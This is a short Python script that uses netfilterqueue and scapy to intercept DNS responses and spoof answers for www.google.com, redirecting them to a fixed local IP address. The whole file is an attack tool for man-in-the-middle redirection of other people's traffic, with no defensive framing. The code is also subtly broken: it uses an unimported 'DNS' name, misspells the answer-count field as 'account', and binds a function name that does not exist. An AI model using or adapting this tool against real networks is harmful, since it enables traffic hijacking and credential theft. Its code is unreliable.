#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy


def processPacket(packet):
	scapyPacket = scapy.IP(packet.get_payload())
	if scapyPacket.haslayer(scapy.DNSRR):
		qname = scapyPacket[scapy.DNSQR].qname
		if "www.google.com" in str(qname):
			print("[+] Spoofing target")	
			answer = scapy.DNSRR(rrname = qname, rdata = "10.211.55.15")
			scapyPacket[DNS].an = answer
			scapyPacket[DNS].account = 1

			del scapyPacket[scapy.IP].len
			del scapyPacket[scapy.IP].chksum
			del scapyPacket[scapy.UDP].len
			del scapyPacket[scapy.UDP].chksum

			packet.set_payload(bytes(scapyPacket))

	packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


































